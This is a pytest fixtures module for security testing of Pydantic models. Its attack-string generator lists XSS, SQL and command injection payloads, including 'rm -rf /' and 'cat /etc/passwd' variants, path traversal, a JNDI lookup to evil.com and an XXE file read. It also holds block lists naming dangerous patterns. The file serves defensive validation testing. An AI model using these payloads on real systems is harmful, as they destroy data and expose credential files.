"""Security Test Configuration and Fixtures.

This module provides shared configuration, fixtures, and utilities
for security testing of Pydantic models across the khive system.
"""

import tempfile
import time
from pathlib import Path
from typing import Any
from unittest.mock import Mock, patch

import pytest

# Security test configuration
SECURITY_CONFIG = {
    "max_validation_time": 1.0,
    "max_string_length": 10000,
    "max_list_length": 1000,
    "required_security_score": 80,
    "enable_timing_tests": True,
    "enable_memory_tests": True,
    "sensitive_patterns": [
        "password",
        "secret",
        "key",
        "token",
        "credential",
        "admin",
        "root",
        "/etc/",
        "/home/",
        "c:\\windows",
        "system32",
        "passwd",
        "shadow",
    ],
}


class SecurityTestHelper:
    """Helper class for security testing utilities."""

    @staticmethod
    def is_safe_string(text: str) -> bool:
        """Check if string is safe from security perspective."""
        if not text:
            return True

        dangerous_patterns = [
            "<script",
            "javascript:",
            "data:",
            "vbscript:",
            "onload=",
            "onerror=",
            "onclick=",
            "onmouseover=",
            "eval(",
            "exec(",
            "system(",
            "import(",
            "../",
            "..\\",
            "/etc/passwd",
            "DROP TABLE",
            "\x00",
            "\x01",
            "\x02",
            "\x03",
            "\x04",
            "\x05",
        ]

        text_lower = text.lower()
        return not any(pattern in text_lower for pattern in dangerous_patterns)

    @staticmethod
    def measure_validation_time(model_class, data: dict[str, Any]) -> float:
        """Measure time taken for model validation."""
        start_time = time.perf_counter()
        try:
            model_class.model_validate(data)
        except Exception:
            pass
        end_time = time.perf_counter()
        return end_time - start_time

    @staticmethod
    def check_error_message_safety(error_message: str) -> bool:
        """Check if error message doesn't leak sensitive information."""
        error_lower = error_message.lower()
        sensitive_patterns = SECURITY_CONFIG["sensitive_patterns"]

        return not any(pattern in error_lower for pattern in sensitive_patterns)

    @staticmethod
    def generate_malicious_strings(max_length: int = 1000) -> list[str]:
        """Generate various malicious string patterns for testing."""
        return [
            # XSS attempts
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<svg onload='alert(1)'>",
            "javascript:alert('XSS')",
            # SQL injection
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1; DELETE FROM users WHERE 1=1; --",
            "' UNION SELECT password FROM users --",
            # Command injection
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "`rm -rf /`",
            "$(rm -rf /)",
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            # Null byte injection
            "test\x00malicious",
            "file.txt\x00.jpg",
            # Unicode attacks
            "\u200b\u200c\u200d",  # Zero-width characters
            "\ufeff",  # BOM
            "\u2000\u2001\u2002",  # Unicode spaces
            # Buffer overflow attempts
            "A" * max_length,
            "B" * (max_length * 2),
            # Format string attacks
            "%s%s%s%s",
            "%x%x%x%x",
            "%n%n%n%n",
            # LDAP injection
            "*)(uid=*)(|(uid=*",
            "admin)(|(password=*",
            # JSON injection
            '{"admin": true}',
            '"}; alert("XSS"); {"',
            # Prototype pollution
            "__proto__",
            "constructor.prototype",
            "__proto__[admin]",
            # Template injection
            "{{7*7}}",
            "${jndi:ldap://evil.com}",
            "{%- for item in lipsum -%}",
            # NoSQL injection
            '{"$ne": null}',
            '{"$where": "this.admin == true"}',
            # XML injection
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<root>&xxe;</root>",
        ]


@pytest.fixture
def security_helper():
    """Provide SecurityTestHelper instance."""
    return SecurityTestHelper()


@pytest.fixture
def malicious_strings():
    """Provide list of malicious strings for testing."""
    return SecurityTestHelper.generate_malicious_strings()


@pytest.fixture
def temp_workspace():
    """Provide temporary workspace for testing."""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)


@pytest.fixture
def mock_dangerous_functions():
    """Mock dangerous functions to prevent actual execution."""
    with (
        patch("os.system") as mock_system,
        patch("subprocess.run") as mock_subprocess,
        patch("eval") as mock_eval,
        patch("exec") as mock_exec,
    ):
        # Configure mocks to track calls but not execute
        mock_system.return_value = 0
        mock_subprocess.return_value = Mock(returncode=0, stdout="", stderr="")
        mock_eval.side_effect = SecurityError("eval() blocked for security")
        mock_exec.side_effect = SecurityError("exec() blocked for security")

        yield {
            "system": mock_system,
            "subprocess": mock_subprocess,
            "eval": mock_eval,
            "exec": mock_exec,
        }


@pytest.fixture
def performance_monitor():
    """Monitor performance during tests."""

    class PerformanceMonitor:
        def __init__(self):
            self.start_time = None
            self.measurements = []

        def start(self):
            self.start_time = time.perf_counter()

        def stop(self, operation_name: str = "test"):
            if self.start_time:
                end_time = time.perf_counter()
                duration = end_time - self.start_time
                self.measurements.append({
                    "operation": operation_name,
                    "duration": duration,
                    "timestamp": end_time,
                })
                self.start_time = None
                return duration
            return 0.0

        def get_average_time(self) -> float:
            if not self.measurements:
                return 0.0
            return sum(m["duration"] for m in self.measurements) / len(
                self.measurements
            )

        def check_time_limit(self, limit: float) -> bool:
            if not self.measurements:
                return True
            return all(m["duration"] <= limit for m in self.measurements)

    return PerformanceMonitor()


@pytest.fixture
def security_test_data():
    """Provide common security test data."""
    return {
        "valid_data": {
            "agent_composition": {"role": "researcher", "context": "test context"},
            "composer_request": {"role": "architect"},
            "complexity_assessment": {
                "overall_complexity_score": 0.7,
                "explanation": "test",
            },
            "orchestration_evaluation": {
                "complexity": "medium",
                "complexity_reason": "Test complexity",
                "total_agents": 5,
                "agent_reason": "Test agents",
                "rounds_needed": 2,
                "role_priorities": ["researcher", "architect"],
                "primary_domains": ["software-architecture"],
                "domain_reason": "Test domains",
                "workflow_pattern": "parallel",
                "workflow_reason": "Test workflow",
                "quality_level": "thorough",
                "quality_reason": "Test quality",
                "rules_applied": ["test_rule"],
                "confidence": 0.8,
                "summary": "Test summary",
            },
        },
        "boundary_data": {
            # String length boundaries
            "empty_string": "",
            "single_char": "A",
            "max_length_100": "A" * 100,
            "over_max_length": "A" * 101,
            "very_long": "A" * 10000,
            # Numeric boundaries
            "zero": 0,
            "negative": -1,
            "float_min": 0.0,
            "float_max": 1.0,
            "over_max": 1.1,
            "under_min": -0.1,
            "max_int": 2**31 - 1,
            "over_max_int": 2**31,
            # Special float values
            "infinity": float("inf"),
            "neg_infinity": float("-inf"),
            "nan": float("nan"),
        },
        "attack_vectors": SecurityTestHelper.generate_malicious_strings(),
    }


class SecurityError(Exception):
    """Custom exception for security-related errors."""



# Configure pytest markers for security tests
def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line("markers", "security: mark test as security-related")
    config.addinivalue_line("markers", "slow_security: mark test as slow security test")
    config.addinivalue_line("markers", "regression: mark test as regression test")
    config.addinivalue_line("markers", "injection: mark test as injection attack test")
    config.addinivalue_line("markers", "dos: mark test as denial of service test")
    config.addinivalue_line("markers", "boundary: mark test as boundary condition test")


def pytest_collection_modifyitems(config, items):
    """Modify test collection for security tests."""
    # Skip slow security tests unless specifically requested
    if not config.getoption("--runslow", default=False):
        skip_slow = pytest.mark.skip(reason="use --runslow to run slow security tests")
        for item in items:
            if "slow_security" in item.keywords:
                item.add_marker(skip_slow)


def pytest_addoption(parser):
    """Add custom command line options."""
    parser.addoption(
        "--runslow", action="store_true", default=False, help="run slow security tests"
    )
    parser.addoption(
        "--security-only",
        action="store_true",
        default=False,
        help="run only security tests",
    )


# Shared security test utilities
def validate_no_sensitive_data(data: Any) -> bool:
    """Validate that data doesn't contain sensitive information."""
    data_str = str(data).lower()
    return not any(
        pattern in data_str for pattern in SECURITY_CONFIG["sensitive_patterns"]
    )


def assert_validation_time_limit(
    validation_func, data: dict[str, Any], time_limit: float = 1.0
):
    """Assert that validation completes within time limit."""
    start_time = time.perf_counter()
    try:
        validation_func(data)
    except Exception:
        pass
    end_time = time.perf_counter()

    validation_time = end_time - start_time
    assert validation_time <= time_limit, (
        f"Validation took {validation_time:.3f}s, exceeds limit of {time_limit}s"
    )


def generate_test_matrix(
    base_data: dict[str, Any], attack_vectors: list[str]
) -> list[dict[str, Any]]:
    """Generate test data matrix combining base data with attack vectors."""
    test_cases = []

    for field_name in base_data:
        for attack_vector in attack_vectors:
            test_case = base_data.copy()
            test_case[field_name] = attack_vector
            test_cases.append(test_case)

    return test_cases
